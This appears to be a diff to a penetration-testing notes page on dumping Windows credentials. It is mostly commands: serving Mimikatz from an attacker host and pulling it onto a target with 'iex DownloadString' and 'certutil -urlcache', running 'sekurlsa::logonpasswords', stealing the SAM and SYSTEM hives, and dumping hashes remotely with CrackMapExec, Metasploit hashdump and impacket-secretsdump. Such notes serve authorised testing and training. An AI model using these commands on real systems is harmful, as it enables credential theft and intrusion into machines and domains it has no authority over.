@@ -2,7 +2,7 @@
 
 ## Locally
 
-### Get NTML w/ Mimikatz
+### Mimikatz
 
 {% content-ref url="../../../tools/tools/mimikatz.md" %}
 [mimikatz.md](../../../tools/tools/mimikatz.md)
@@ -29,15 +29,17 @@ Now, check the privilege that we have in the machine with this command:
 whoami /all
 ```
 
-Then, we need to transfer the tool to get NTML hashes to the target machine.
+Then, we need to transfer the tool to dump hashes to the target machine.
 
 {% code title="Linux -> Windows Target" %}
 ```bash
 # into linux
+cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
 python3 -m http.server 80 
 
 # Download files from windows target
 iex (New-Object Net.WebClient).DownloadString('http://$IP/$FILE_NAME')
+certutil -urlcache -f http://$IP/$FILE_NAME $LOCAL_FILE_NAME
 ```
 {% endcode %}
 
@@ -54,7 +56,7 @@ iex (New-Object Net.WebClient).DownloadString('http://$IP/$FILE_NAME')
 #### mimikatz.exe
 
 ```powershell
-PS> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
+PS> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 
 # output
 Authentication Id : 0 ; 302247 (00000000:00049ca7)
@@ -81,14 +83,6 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 <figure><img src="../../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>
 
-#### CrackMapExec
-
-```bash
-crackmapexec smb <IP> -u USER -p PASSWORD -M mimikatz
-```
-
-
-
 
 
 ### Stealing SAM & SYSTEM
@@ -108,11 +102,19 @@ samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
 
+
+
 ## Remotely
 
 Sections below allow us to dump credentials from Kali linux to Windows target.
 
 ### CrackMapExec
+
+#### Mimikatz
+
+```bash
+crackmapexec smb <IP> -u USER -p PASSWORD -M mimikatz
+```
 
 #### Dump SAM <a href="#dump-sam-hashes" id="dump-sam-hashes"></a>
 
@@ -144,6 +146,12 @@ msf> hashdump
 ```
 
 
+
+### Impacket's secretsdump&#x20;
+
+```bash
+impacket-secretsdump DOMAIN.COM/USER:PASS@DC_IP
+```
 
 
 
